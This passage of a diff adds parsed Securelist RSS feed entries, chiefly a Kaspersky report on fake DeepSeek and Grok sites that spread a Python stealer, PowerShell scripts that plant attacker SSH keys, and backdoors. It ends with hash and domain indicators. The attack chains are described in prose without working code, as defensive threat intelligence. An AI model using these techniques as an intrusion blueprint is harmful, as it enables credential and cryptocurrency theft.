href=\"https://opentip.kaspersky.com/session-out.com/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______0876bd98974634d7&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">session-out[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/zeltech.live/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______7c8c611ce2fc6d9f&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">zeltech[.]live</a><br />\n<a href=\"https://opentip.kaspersky.com/ziptec.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______1f976c5e7b9f8845&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">ziptec[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/depo-govpk.com/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______73f793fec0971159&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">depo-govpk[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/crontec.site/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______021550f8e56265ef&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">crontec[.]site</a><br />\n<a href=\"https://opentip.kaspersky.com/mteron.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______a58b5a13860efe82&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">mteron[.]info</a><br />\n<a href=\"https://opentip.kaspersky.com/mevron.tech/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______ec792b1d19273cef&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">mevron[.]tech</a><br />\n<a href=\"https://opentip.kaspersky.com/veorey.live/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______91a77b7fe9c03b03&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">veorey[.]live</a><br />\n<a href=\"https://opentip.kaspersky.com/mod-kh.info/?icid=gl_OpenTIP_acq_ona_smm__onl_b2b_securelist_lnk_sm-team_______cc0e5c3872689a4a&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">mod-kh[.]info</a></p>"
+                }
+            ],
+            "wfw_commentrss": "https://securelist.com/sidewinder-apt-updates-its-toolset-and-targets-nuclear-sector/115847/feed/",
+            "slash_comments": "0",
+            "media_content": [
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10080620/sidewinder-maritime-featured.jpg",
+                    "width": "2000",
+                    "height": "1000"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10080620/sidewinder-maritime-featured-1024x512.jpg",
+                    "width": "1024",
+                    "height": "512"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10080620/sidewinder-maritime-featured-300x150.jpg",
+                    "width": "300",
+                    "height": "150"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/10080620/sidewinder-maritime-featured-150x150.jpg",
+                    "width": "150",
+                    "height": "150"
+                }
+            ],
+            "media_keywords": "thumbnail"
+        },
+        {
+            "title": "Trojans disguised as AI: Cybercriminals exploit DeepSeek\u2019s popularity",
+            "title_detail": {
+                "type": "text/plain",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "Trojans disguised as AI: Cybercriminals exploit DeepSeek\u2019s popularity"
+            },
+            "links": [
+                {
+                    "rel": "alternate",
+                    "type": "text/html",
+                    "href": "https://securelist.com/backdoors-and-stealers-prey-on-deepseek-and-grok/115801/"
+                }
+            ],
+            "link": "https://securelist.com/backdoors-and-stealers-prey-on-deepseek-and-grok/115801/",
+            "comments": "https://securelist.com/backdoors-and-stealers-prey-on-deepseek-and-grok/115801/#respond",
+            "authors": [
+                {
+                    "name": "Vladislav Tushkanov, Vasily Kolesnikov, Oleg Kupreev, Denis Sitchikhin, Alexander Kryazhev"
+                }
+            ],
+            "author": "Vladislav Tushkanov, Vasily Kolesnikov, Oleg Kupreev, Denis Sitchikhin, Alexander Kryazhev",
+            "author_detail": {
+                "name": "Vladislav Tushkanov, Vasily Kolesnikov, Oleg Kupreev, Denis Sitchikhin, Alexander Kryazhev"
+            },
+            "published": "Thu, 06 Mar 2025 10:00:04 +0000",
+            "published_parsed": [
+                2025,
+                3,
+                6,
+                10,
+                0,
+                4,
+                3,
+                65,
+                0
+            ],
+            "tags": [
+                {
+                    "term": "Malware descriptions",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "AI",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Backdoor",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "DeepSeek",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "DLL",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "DLL sideloading",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Infostealers",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "LLM",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Descriptions",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Technologies",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Microsoft Windows",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "PowerShell",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Python",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "SSH",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Trojan",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Twitter",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Web threats",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Windows malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "full",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "large",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "medium",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "thumbnail",
+                    "scheme": null,
+                    "label": null
+                }
+            ],
+            "id": "https://kasperskycontenthub.com/securelist/?p=115801",
+            "guidislink": false,
+            "summary": "Kaspersky experts have discovered campaigns distributing stealers, malicious PowerShell scripts, and backdoors through web pages mimicking the DeepSeek and Grok websites.",
+            "summary_detail": {
+                "type": "text/html",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "Kaspersky experts have discovered campaigns distributing stealers, malicious PowerShell scripts, and backdoors through web pages mimicking the DeepSeek and Grok websites."
+            },
+            "content": [
+                {
+                    "type": "text/html",
+                    "language": null,
+                    "base": "https://securelist.com/feed/",
+                    "value": "<p><img alt=\"\" class=\"attachment-securelist-huge-promo size-securelist-huge-promo wp-post-image\" height=\"400\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06073527/deepseek-malware-featured-image-990x400.jpg\" width=\"990\" /></p><h2 id=\"introduction\">Introduction</h2>\n<p>Among the most significant events in the AI world in early 2025 was the release of DeepSeek-R1 \u2013 a powerful reasoning large language model (LLM) <a href=\"https://www.ftc.gov/policy/advocacy-research/tech-at-ftc/2024/07/open-weights-foundation-models\" rel=\"noopener\" target=\"_blank\">with open weights</a>. It&#8217;s available both for local use and as a free service. Since DeepSeek was the first service to offer access to a reasoning LLM to a wide audience, it quickly gained popularity, mirroring the success of ChatGPT. Naturally, this surge in interest also attracted cybercriminals.</p>\n<p>While analyzing our internal threat intelligence data, we discovered several groups of websites mimicking the official DeepSeek chatbot site and distributing malicious code disguised as a client for the popular service.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115816\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05145826/DeepSeek_malware_01.png\"><img alt=\"Screenshot of the official DeepSeek website (February 2025)\" class=\"size-large wp-image-115816\" height=\"495\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05145826/DeepSeek_malware_01-1024x495.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115816\">Screenshot of the official DeepSeek website (February 2025)</p></div>\n<h2 id=\"scheme-1-python-stealer-and-non-existent-deepseek-client\">Scheme 1: Python stealer and non-existent DeepSeek client</h2>\n<p>The first group of websites was hosted on domains whose names included DeepSeek model versions (V3 and R1):</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">r1-deepseek[.]net</pre>;</li>\n<li><pre class=\"crayon-plain-tag\">v3-deepseek[.]com</pre>.</li>\n</ul>\n<p>As shown in the screenshot, the fake website lacks the option to start a chat \u2013 you can only download an application. However, the real DeepSeek doesn&#8217;t have an official Windows client.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115817\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05150822/DeepSeek_malware_02.png\"><img alt=\"Screenshot of the fake website\" class=\"size-large wp-image-115817\" height=\"416\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05150822/DeepSeek_malware_02-1024x416.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115817\">Screenshot of the fake website</p></div>\n<p>Clicking the &#8220;Get DeepSeek App&#8221; button downloads a small archive, <pre class=\"crayon-plain-tag\">deep-seek-installation.zip</pre>. The archive contains the <pre class=\"crayon-plain-tag\">DeepSeek Installation.lnk</pre> file, which holds a URL.</p>\n<p>At the time of publishing this research, the attackers had modified the fake page hosted on the <pre class=\"crayon-plain-tag\">v3-deepseek[.]com</pre> domain. It now prompts users to download a client for the Grok model developed by xAI. We&#8217;re observing similar activity on the <pre class=\"crayon-plain-tag\">v3-grok[.]com</pre> domain as well. Disguised as a client is an archive named <pre class=\"crayon-plain-tag\">grok-ai-installation.zip</pre>, containing the same shortcut.</p>\n<p>Executing the .lnk file runs a script located at the URL inside the shortcut:</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05152817/DeepSeek_malware_03.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-115818\" height=\"258\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05152817/DeepSeek_malware_03.png\" width=\"729\" /></a></p>\n<p>This script downloads and unpacks an archive named <pre class=\"crayon-plain-tag\">f.zip</pre>.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115819\" style=\"width: 194px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05152925/DeepSeek_malware_04.png\"><img alt=\"Contents of the unpacked archive\" class=\"size-full wp-image-115819\" height=\"169\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05152925/DeepSeek_malware_04.png\" width=\"184\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115819\">Contents of the unpacked archive</p></div>\n<p>Next, the script runs the <pre class=\"crayon-plain-tag\">1.bat</pre> file from the unpacked archive.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115820\" style=\"width: 322px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153119/DeepSeek_malware_05.png\"><img alt=\"Contents of the BAT file\" class=\"size-full wp-image-115820\" height=\"81\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153119/DeepSeek_malware_05.png\" width=\"312\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115820\">Contents of the BAT file</p></div>\n<p>The downloaded archive also contains the <pre class=\"crayon-plain-tag\">svchost.exe</pre> and <pre class=\"crayon-plain-tag\">python.py</pre> files. The first one is a legitimate file <pre class=\"crayon-plain-tag\">python.exe</pre>, renamed to mimic a Windows process to mislead users checking running applications in Task Manager.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153157/DeepSeek_malware_06.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-115821\" height=\"168\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153157/DeepSeek_malware_06.png\" width=\"362\" /></a></p>\n<p>It is used to launch <pre class=\"crayon-plain-tag\">python.py</pre>, which contains the malicious payload (we&#8217;ve also seen this file named <pre class=\"crayon-plain-tag\">code.py</pre>). This is a stealer script written in Python that we haven&#8217;t seen in attacks before. If it&#8217;s executed successfully, the attackers obtain a wealth of data from the victim&#8217;s computer: cookies and session tokens from various browsers, login credentials for email, gaming, and other accounts, files with certain extensions, cryptocurrency wallet information, and more.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153222/DeepSeek_malware_07.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115822\" height=\"449\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153222/DeepSeek_malware_07-1024x449.png\" width=\"1024\" /></a></p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153255/DeepSeek_malware_08.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115823\" height=\"784\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153255/DeepSeek_malware_08-1024x784.png\" width=\"1024\" /></a></p>\n<p>After collecting the necessary data, the script generates an archive and then either sends it to the stealer&#8217;s operators using a Telegram bot or uploads it to the Gofile file-sharing service. Thus, attempting to use the chatbot could result in the victim losing social media access, personal data, and even cryptocurrency. If corporate credentials are stored on the compromised device, entire organizations could also be at risk, leading to far more severe consequences.</p>\n<h2 id=\"scheme-2-malicious-script-and-a-million-views\">Scheme 2: Malicious script and a million views</h2>\n<p>In another case, fake DeepSeek websites were found on the following domains:</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">deepseek-pc-ai[.]com</pre></li>\n<li><pre class=\"crayon-plain-tag\">deepseek-ai-soft[.]com</pre></li>\n</ul>\n<p>We discovered the first domain back in early February, hosting the default Apache web server page with no content. Later, this domain displayed a new web page closely resembling the DeepSeek website. Notably, the fake site uses <a href=\"https://encyclopedia.kaspersky.com/glossary/geofencing/\" rel=\"noopener\" target=\"_blank\">geofencing</a>: when requests come from certain IP addresses, such as Russian ones, it returns a placeholder page filled with generic SEO text about DeepSeek (we believe this text may have been <a href=\"https://securelist.com/llm-phish-blunders/114367/\" rel=\"noopener\" target=\"_blank\">LLM-generated</a>):</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153419/DeepSeek_malware_09.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115824\" height=\"495\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153419/DeepSeek_malware_09-1024x495.png\" width=\"1024\" /></a></p>\n<p>If the IP address and other request parameters meet the specified criteria, the server returns a page resembling DeepSeek. Users are prompted to download a client or start the chatbot, but either action results in downloading a malicious installer created using <a href=\"https://en.wikipedia.org/wiki/Inno_Setup\" rel=\"noopener\" target=\"_blank\">Inno Setup</a>. Kaspersky products detect it as <pre class=\"crayon-plain-tag\">Trojan-Downloader.Win32.TookPS.*</pre>.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06075655/7.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115843\" height=\"431\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06075655/7-1024x431.png\" width=\"1024\" /></a></p>\n<p>When executed, this installer contacts malicious URLs to receive a command that will be executed using cmd. The most common command launches <pre class=\"crayon-plain-tag\">powershell.exe</pre> with a Base64-encoded script as an argument. This script accesses an encoded URL to download another PowerShell script, which activates the built-in SSH service and modifies its configuration using the attacker&#8217;s keys, allowing remote access to the victim&#8217;s computer.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115826\" style=\"width: 867px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153658/DeepSeek_malware_11.png\"><img alt=\"Part of the malicious PowerShell script\" class=\"size-full wp-image-115826\" height=\"877\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153658/DeepSeek_malware_11.png\" width=\"857\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115826\">Part of the malicious PowerShell script</p></div>\n<p>This case is notable because we managed to identify the primary vector for spreading the malicious links \u2013 posts on the social network X (formerly Twitter):</p>\n<p align=\"center\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072310/6-1.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-115837\" height=\"699\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072310/6-1.png\" width=\"585\" /></a></p>\n<p>This post, directing users to <pre class=\"crayon-plain-tag\">deepseek-pc-ai[.]com</pre>, was made from an account belonging to an Australian company. The post gained 1.2 million views and over a hundred reposts, most of which were probably made by bots \u2013 note the similar usernames and identifiers in their bios:</p>\n<p align=\"center\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072322/5-1.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-115838\" height=\"992\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072322/5-1.png\" width=\"913\" /></a></p>\n<p>Some users in the comments dutifully point out the malicious nature of the link.</p>\n<p>Links to <pre class=\"crayon-plain-tag\">deepseek-ai-soft[.]com</pre> were also distributed through X posts, but at the time of investigation, they were only available in Google&#8217;s cache:<br />\n<a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153909/DeepSeek_malware_14.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-115829\" height=\"321\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153909/DeepSeek_malware_14.png\" width=\"799\" /></a></p>\n<h2 id=\"scheme-3-backdoors-and-attacks-on-chinese-users\">Scheme 3: Backdoors and attacks on Chinese users</h2>\n<p>We also encountered sites that directly distributed malicious executable files. One such file was associated with the following domains:</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">app.delpaseek[.]com</pre>;</li>\n<li><pre class=\"crayon-plain-tag\">app.deapseek[.]com</pre>;</li>\n<li><pre class=\"crayon-plain-tag\">dpsk.dghjwd[.]cn</pre>.</li>\n</ul>\n<p>These attacks target more technically advanced users \u2013 the downloaded malicious payload mimics Ollama, a framework for running LLMs such as DeepSeek on local hardware. This tactic reduces suspicion among potential victims. Kaspersky solutions detect this payload as <pre class=\"crayon-plain-tag\">Backdoor.Win32.Xkcp.a</pre>.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05154027/DeepSeek_malware_15.jpg\"><img alt=\"\" class=\"aligncenter size-large wp-image-115830\" height=\"1024\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05154027/DeepSeek_malware_15-551x1024.jpg\" width=\"551\" /></a></p>\n<p>The victim only needed to launch the &#8220;DeepSeek client&#8221; on their device to trigger the malware, which creates a KCP tunnel with predefined parameters.</p>\n<p>Additionally, we observed attacks where a victim&#8217;s device downloaded the <pre class=\"crayon-plain-tag\">deep_windows_Setup.zip</pre> archive, containing a malicious executable. The archive was downloaded from the following domains:</p>\n<ul>\n<li><pre class=\"crayon-plain-tag\">deep-seek[.]bar</pre>;</li>\n<li><pre class=\"crayon-plain-tag\">deep-seek[.]rest</pre>.</li>\n</ul>\n<p>The malware in the archive is detected by Kaspersky solutions as <pre class=\"crayon-plain-tag\">Trojan.Win32.Agent.xbwfho</pre>. This is an installer created with Inno Setup that uses <a href=\"https://encyclopedia.kaspersky.com/glossary/dll-sideloading/\" target=\"_blank\">DLL sideloading</a> to load a malicious library. The DLL in turn extracts and loads into memory a payload hidden using steganography \u2014 a Farfli backdoor modification \u2014 and injects it into a process.</p>\n<p>Both of these campaigns, judging by the language of the bait pages, are targeting Chinese-speaking users.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The nature of the fake websites described in this article suggests these campaigns are widespread and not aimed at specific users.</p>\n<p>Cybercriminals use various schemes to lure victims to malicious resources. Typically, links to such sites are distributed through messengers and social networks, as seen in the example with the X post. Attackers may also use <a href=\"https://encyclopedia.kaspersky.com/glossary/typosquatting/\" rel=\"noopener\" target=\"_blank\">typosquatting</a> or purchase ad traffic to malicious sites through numerous affiliate programs.</p>\n<p>We strongly advise users to carefully check the addresses of websites they visit, especially if links come from unverified sources. This is especially important for highly popular services. In this case, it&#8217;s particularly noteworthy that DeepSeek doesn&#8217;t have a native Windows client. This isn&#8217;t the first time that cybercriminals have exploited the popularity of chatbots to distribute malware: they&#8217;ve previously targeted regular users with <a href=\"https://www.kaspersky.com/blog/chatgpt-stealer-win-client/47274/\" rel=\"noopener\" target=\"_blank\">Trojans disguised as ChatGPT clients</a> and developers with <a href=\"https://www.kaspersky.com/blog/jarkastealer-in-pypi-packages/52640/\" rel=\"noopener\" target=\"_blank\">malicious packages</a> in PyPI. Simple digital hygiene practices, combined with <a href=\"https://www.kaspersky.com/premium?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team___kprem____3b7590825188da5e\" rel=\"noopener\" target=\"_blank\">a cutting-edge security solution</a>, can significantly reduce the risk of device infection and personal data loss.</p>\n<h2 id=\"indicators-of-compromise\">Indicators of compromise</h2>\n<h3 id=\"md5\">MD5</h3>\n<p><a href=\"https://opentip.kaspersky.com/4ef18b2748a8f499ed99e986b4087518/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______64f50871154f1360&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">4ef18b2748a8f499ed99e986b4087518</a><br />\n<a href=\"https://opentip.kaspersky.com/155bdb53d0bf520e3ae9b47f35212f16/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______c3c6b3ae8d373051&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">155bdb53d0bf520e3ae9b47f35212f16</a><br />\n<a href=\"https://opentip.kaspersky.com/6d097e9ef389bbe62365a3ce3cbaf62d/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______d05f291c1022c5cb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">6d097e9ef389bbe62365a3ce3cbaf62d</a><br />\n<a href=\"https://opentip.kaspersky.com/3e5c2097ffb0cb3a6901e731cdf7223b/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______ffd011809162f8c9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">3e5c2097ffb0cb3a6901e731cdf7223b</a><br />\n<a href=\"https://opentip.kaspersky.com/e1ea1b600f218c265d09e7240b7ea819/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______5adefae768629970&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">e1ea1b600f218c265d09e7240b7ea819</a><br />\n<a href=\"https://opentip.kaspersky.com/7cb0ca44516968735e40f4fac8c615ce/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______c661f49993066b52&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">7cb0ca44516968735e40f4fac8c615ce</a><br />\n<a href=\"https://opentip.kaspersky.com/7088986a8d8fa3ed3d3ddb1f5759ec5d/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______3515f6339cc3ad70&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">7088986a8d8fa3ed3d3ddb1f5759ec5d</a></p>\n<h3 id=\"malicious-domains\">Malicious domains</h3>\n<p><a href=\"https://opentip.kaspersky.com/r1-deepseek.net/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______a3096d39a9cc1961&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">r1-deepseek[.]net</a><br />\n<a href=\"https://opentip.kaspersky.com/v3-deepseek.com/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______855f0a889b4869e2&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">v3-deepseek[.]com</a><br />\n<a href=\"https://securelist.com/feed/deepseek-pc-ai%5b.%5dcom\">deepseek-pc-ai[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/deepseek-ai-soft.com/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______f34acbe6374c727b&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">deepseek-ai-soft[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/app.delpaseek.com/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______1b117c940a9f6667&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">app.delpaseek[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/app.deapseek.com/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______64d31fc04a804252&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">app.deapseek[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/dpsk.dghjwd.cn/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______c4145f916304cc64&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">dpsk.dghjwd[.]cn</a><br />\n<a href=\"https://opentip.kaspersky.com/deep-seek.bar/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______3fb0f06cc166fce7&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">deep-seek[.]bar</a><br />\n<a href=\"https://opentip.kaspersky.com/deep-seek.rest/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______c4a741df25d54594&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">deep-seek[.]rest</a><br />\n<a href=\"https://opentip.kaspersky.com/v3-grok.com/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______e11e9f1878956389&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" rel=\"noopener\" target=\"_blank\">v3-grok[.]com</a></p>"
+                }
+            ],
+            "wfw_commentrss": "https://securelist.com/backdoors-and-stealers-prey-on-deepseek-and-grok/115801/feed/",
+            "slash_comments": "0",
+            "media_content": [
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06073527/deepseek-malware-featured-image.jpg",
+                    "width": "2000",
+                    "height": "1000"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06073527/deepseek-malware-featured-image-1024x512.jpg",
+                    "width": "1024",
+                    "height": "512"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06073527/deepseek-malware-featured-image-300x150.jpg",
+                    "width": "300",
+                    "height": "150"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06073527/deepseek-malware-featured-image-150x150.jpg",
+                    "width": "150",
+                    "height": "150"
+                }
+            ],
+            "media_keywords": "thumbnail"
+        },
+        {
+            "title": "Undercover miner: how YouTubers get pressed into distributing SilentCryptoMiner as a restriction bypass tool",
+            "title_detail": {
+                "type": "text/plain",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "Undercover miner: how YouTubers get pressed into distributing SilentCryptoMiner as a restriction bypass tool"
+            },
+            "links": [
+                {
+                    "rel": "alternate",
+                    "type": "text/html",
+                    "href": "https://securelist.com/silentcryptominer-spreads-through-blackmail-on-youtube/115788/"
+                }
+            ],
+            "link": "https://securelist.com/silentcryptominer-spreads-through-blackmail-on-youtube/115788/",
+            "comments": "https://securelist.com/silentcryptominer-spreads-through-blackmail-on-youtube/115788/#respond",
+            "authors": [
+                {
